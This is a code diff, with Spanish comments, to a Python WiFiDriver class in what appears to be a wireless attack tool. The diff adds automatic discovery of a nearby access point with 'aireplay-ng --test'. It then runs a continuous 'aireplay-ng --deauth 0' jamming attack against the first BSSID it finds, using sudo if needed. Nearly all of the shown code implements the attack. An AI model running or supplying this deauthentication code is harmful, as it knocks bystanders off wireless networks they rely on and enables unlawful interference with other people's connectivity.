@@ -858,15 +858,82 @@ class WiFiDriver:
                         print("ERROR: No se pudo activar modo monitor.")
                         return False
                 
+                # Si no se especifica BSSID, buscar uno automáticamente en el canal actual
+                actual_bssid = target_bssid
+                if not actual_bssid:
+                    print(f"Buscando APs en canal {self.current_channel}...")
+                    # Usar aireplay-ng --test para encontrar APs rápidamente
+                    import os
+                    if hasattr(os, 'geteuid') and os.geteuid() == 0:
+                        test_cmd = ['aireplay-ng', '--test', interface]
+                    else:
+                        test_cmd = ['sudo', 'aireplay-ng', '--test', interface]
+                    
+                    try:
+                        test_result = subprocess.run(
+                            test_cmd,
+                            stdout=subprocess.PIPE,
+                            stderr=subprocess.PIPE,
+                            timeout=5,
+                            universal_newlines=True
+                        )
+                        
+                        # Parsear salida para encontrar BSSIDs
+                        output = test_result.stdout + test_result.stderr
+                        bssids_found = []
+                        for line in output.split('\n'):
+                            # Buscar líneas con formato: "BSSID - channel: X - 'SSID'"
+                            if 'channel:' in line and ' - ' in line:
+                                parts = line.split(' - ')
+                                if len(parts) >= 1:
+                                    bssid_part = parts[0].strip()
+                                    # Verificar que sea un BSSID válido (formato MAC)
+                                    if ':' in bssid_part and len(bssid_part.split(':')) == 6:
+                                        # Extraer canal
+                                        channel_part = None
+                                        for p in parts:
+                                            if 'channel:' in p:
+                                                channel_part = p
+                                                break
+                                        
+                                        if channel_part:
+                                            try:
+                                                ch_num = int(channel_part.split(':')[1].strip().split()[0])
+                                                # Solo usar APs en el canal actual
+                                                if ch_num == self.current_channel:
+                                                    bssids_found.append(bssid_part)
+                                            except:
+                                                pass
+                        
+                        if bssids_found:
+                            actual_bssid = bssids_found[0]  # Usar el primer AP encontrado
+                            print(f"AP encontrado: {actual_bssid} (canal {self.current_channel})")
+                            if len(bssids_found) > 1:
+                                print(f"Nota: Se encontraron {len(bssids_found)} APs. Usando: {actual_bssid}")
+                        else:
+                            print(f"ERROR: No se encontraron APs en el canal {self.current_channel}")
+                            print("Sugerencias:")
+                            print("  1. Usa 'wifiscan' para ver todas las redes disponibles")
+                            print("  2. Especifica un BSSID manualmente: jam <canal> <BSSID>")
+                            print("  3. Cambia a un canal con tráfico: setchannel <canal>")
+                            return False
+                    except subprocess.TimeoutExpired:
+                        print("ERROR: Timeout buscando APs")
+                        return False
+                    except Exception as e:
+                        print(f"ERROR buscando APs: {e}")
+                        print("Intenta especificar un BSSID manualmente: jam <canal> <BSSID>")
+                        return False
+                
                 # Usar aireplay-ng para deauth attack
                 # Nota: Si ya estamos ejecutando con sudo, no necesitamos sudo en el comando
                 import os
                 if hasattr(os, 'geteuid') and os.geteuid() == 0:
                     # Ya estamos como root, no usar sudo
-                    cmd = ['aireplay-ng', '--deauth', '0', '-a', target_bssid or 'FF:FF:FF:FF:FF:FF', interface]
+                    cmd = ['aireplay-ng', '--deauth', '0', '-a', actual_bssid, interface]
                 else:
                     # Necesitamos sudo
-                    cmd = ['sudo', 'aireplay-ng', '--deauth', '0', '-a', target_bssid or 'FF:FF:FF:FF:FF:FF', interface]
+                    cmd = ['sudo', 'aireplay-ng', '--deauth', '0', '-a', actual_bssid, interface]
                 
                 print(f"Iniciando jamming en {interface}...")
                 print(f"Comando: {' '.join(cmd)}")
